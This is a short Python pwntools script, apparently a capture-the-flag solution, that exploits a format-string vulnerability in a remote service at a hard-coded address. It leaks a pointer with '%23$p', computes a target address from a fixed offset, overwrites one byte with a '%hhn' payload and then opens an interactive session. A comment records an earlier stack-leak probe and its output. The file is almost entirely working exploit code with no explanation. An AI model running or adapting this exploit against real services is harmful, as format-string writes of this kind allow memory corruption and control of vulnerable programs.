from pwn import p64, remote, context

#~~~Give me secret number: %7$p.%8$p.%9$p.%10$p.%11$p.%12$p.%13$p.%14$p.%15$p
#0x252e702439252e70.0x3131252e70243031.0x70243231252e7024.0x252e70243331252e.0x3531252e70243431.0xa7024.(nil).(nil).(nil)
offset = 0x133F
#p = remote("128.199.247.205", 1332)
p = remote("14.225.255.180", 1921)

# context.log_level = 'DEBUG'
p.recvuntil("number: ")
p.sendline(b"%23$p")
s = int(p.recvline().strip(), 16)
print(s)
addr = s - offset + 0x401C
print(addr)
p.sendline(b'%171c%8$hhnaaaaa' + p64(addr))
p.interactive()
